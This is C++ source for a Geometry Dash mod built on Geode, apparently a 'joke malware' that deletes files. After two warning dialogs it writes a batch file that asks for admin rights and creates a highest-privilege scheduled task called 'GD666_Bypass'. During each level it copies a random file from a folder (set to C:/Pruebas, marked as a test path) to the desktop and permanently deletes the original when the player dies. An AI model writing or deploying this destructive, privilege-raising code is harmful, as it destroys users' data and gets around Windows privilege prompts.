#define _CRT_SECURE_NO_WARNINGS
#include <Geode/Geode.hpp>
#include <Geode/modify/MenuLayer.hpp>
#include <Geode/modify/PlayLayer.hpp>
#include <fstream>
#include <filesystem>
#include <random>

using namespace geode::prelude;
namespace fs = std::filesystem;

// Global variables for file tracking
std::string g_copiedFileName = "";
fs::path g_sourcePath = "C:/Pruebas"; // Test path

fs::path getDesktopPath() {
    char* userProfile = std::getenv("USERPROFILE");
    if (userProfile) {
        return fs::path(userProfile) / "Desktop";
    }
    return "";
}

fs::path getVerificationFilePath() {
    char* tempEnv = std::getenv("TEMP");
    if (tempEnv) {
        return fs::path(tempEnv) / "GD666_Success.txt";
    }
    return "";
}

void createAnGD666Bat() {
    char* tempEnv = std::getenv("TEMP");
    if (!tempEnv) return;
    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
    fs::path successPath = getVerificationFilePath();
    
    std::ofstream batFile(batPath);
    batFile << "@echo off\n";
    batFile << ":: Check for administrative privileges\n";
    batFile << "net session >nul 2>&1\n";
    batFile << "if %errorLevel% neq 0 (\n";
    batFile << "    echo Requesting administrative privileges for one-time setup...\n";
    batFile << "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n";
    batFile << "    exit /b\n";
    batFile << ")\n";
    
    batFile << ":run_setup\n";
    batFile << "set \"GD_PATH=C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\"\n";
    
    batFile << ":: 1. Create a Scheduled Task that runs with Highest Privileges\n";
    batFile << "schtasks /create /tn \"GD666_Bypass\" /tr \"'%GD_PATH%'\" /sc ONCE /st 00:00 /rl HIGHEST /f >nul 2>&1\n";
    
    batFile << ":: 2. Create a verification file to signal success to the mod\n";
    batFile << "echo Success > \"" << successPath.string() << "\"\n";
    
    batFile << ":: 3. Run the task\n";
    batFile << "schtasks /run /tn \"GD666_Bypass\"\n";
    
    batFile << "echo Setup complete.\n";
    batFile << "exit\n";
    batFile.close();
}

void disableMod() {
    auto mod = Mod::get();
    mod->setSettingValue("enabled", false);
    mod->setSavedValue("confirmed", false);
    
    char* tempEnv = std::getenv("TEMP");
    if (tempEnv) {
        fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
        fs::path successPath = getVerificationFilePath();
        if (fs::exists(batPath)) { try { fs::remove(batPath); } catch (...) {} }
        if (fs::exists(successPath)) { try { fs::remove(successPath); } catch (...) {} }
        system("schtasks /delete /tn \"GD666_Bypass\" /f >nul 2>&1");
    }
    utils::game::restart(true);
}

class $modify(MyMenuLayer, MenuLayer) {
    bool init() override {
        if (!MenuLayer::init()) return false;

        bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
        fs::path successFile = getVerificationFilePath();

        // If it was "confirmed" but the success file is missing, the setup failed (UAC rejected)
        if (isConfirmed && !fs::exists(successFile)) {
            // Automatically call disableMod to clean up and reset state
            this->runAction(CCSequence::create(
                CCDelayTime::create(0.1f),
                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onSetupFailed)),
                nullptr
            ));
            return true;
        }

        if (isEnabled && !isConfirmed) {
            this->runAction(CCSequence::create(
                CCDelayTime::create(0.5f),
                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
                nullptr
            ));
        }

        return true;
    }

    void onSetupFailed() {
        disableMod();
    }

    void showFirstMessage() {
        createAnGD666Bat();
        auto alert = FLAlertLayer::create(
            this,
            "Are you sure?",
            "The software you just executed is considered malware.\nThis mod will harm your computer and makes it unusable.\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\nIf you know what this mod does and are using a safe environment to test, press Yes to start it.\n\nDO YOU WANT TO EXECUTE THIS MOD, RESULTING IN AN UNUSABLE MACHINE?",
            "No", "Yes"
        );
        alert->setTag(1);
        alert->show();
    }

    void showLastMessage() {
        auto alert = FLAlertLayer::create(
            this,
            "LAST WARNING!",
            "THIS IS THE LAST WARNING!\n\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MOD!\nSTILL EXECUTE IT?",
            "No", "Yes"
        );
        alert->setTag(2);
        alert->show();
    }

    void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
        if (alert->getTag() == 1) {
            if (btn2) {
                this->showLastMessage();
            } else {
                disableMod();
            }
        } else if (alert->getTag() == 2) {
            if (btn2) {
                Mod::get()->setSavedValue("confirmed", true);
                char* tempEnv = std::getenv("TEMP");
                if (tempEnv) {
                    std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
                    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
                    
                    // Restart to check if the success file was created
                    this->runAction(CCSequence::create(
                        CCDelayTime::create(1.5f), // Slightly longer wait for UAC interaction
                        CCCallFunc::create(this, callfunc_selector(MyMenuLayer::onConfirmRestart)),
                        nullptr
                    ));
                }
            } else {
                disableMod();
            }
        }
    }

    void onConfirmRestart() {
        utils::game::restart(true);
    }
};

class $modify(MyPlayLayer, PlayLayer) {
    struct Fields {
        std::string m_copiedFile = "";
        fs::path m_desktopPath = "";
        bool m_hasDied = false;
    };

    bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
        if (!PlayLayer::init(level, useReplay, dontSave)) return false;

        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");
        fs::path successFile = getVerificationFilePath();
        
        if (!isConfirmed || !fs::exists(successFile)) {
            return true; 
        }

        if (fs::exists(g_sourcePath)) {
            std::vector<fs::path> files;
            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file()) {
                        files.push_back(dir_entry.path());
                    }
                }
            } catch (...) {}

            if (!files.empty()) {
                std::random_device rd;
                std::mt19937 g(rd());
                std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
                
                fs::path selectedFile = files[dis(g)];
                m_fields->m_copiedFile = selectedFile.filename().string();
                m_fields->m_desktopPath = getDesktopPath();

                if (!m_fields->m_desktopPath.empty()) {
                    try {
                        fs::copy(selectedFile, m_fields->m_desktopPath / m_fields->m_copiedFile, fs::copy_options::overwrite_existing);
                        log::info("Mod 666: File selected for 'sacrifice': {}", m_fields->m_copiedFile);
                    } catch (...) {}
                }
            }
        }

        return true;
    }

    void onQuit() {
        if (!m_fields->m_hasDied && !m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }
        }
        PlayLayer::onQuit();
    }

    void destroyPlayer(PlayerObject* p0, GameObject* p1) {
        PlayLayer::destroyPlayer(p0, p1);
        
        if (!m_fields->m_copiedFile.empty() && !m_fields->m_hasDied) {
            m_fields->m_hasDied = true;
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }

            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
                        fs::remove(dir_entry.path());
                        std::string msg = "File deleted: " + m_fields->m_copiedFile;
                        Notification::create(msg, NotificationIcon::Error)->show();
                        log::warn("Mod 666: Player died. {} has been permanently deleted.", m_fields->m_copiedFile);
                        break; 
                    }
                }
            } catch (const std::exception& e) {
                log::error("Mod 666: Error while trying to delete file: {}", e.what());
            }
        }
    }
};
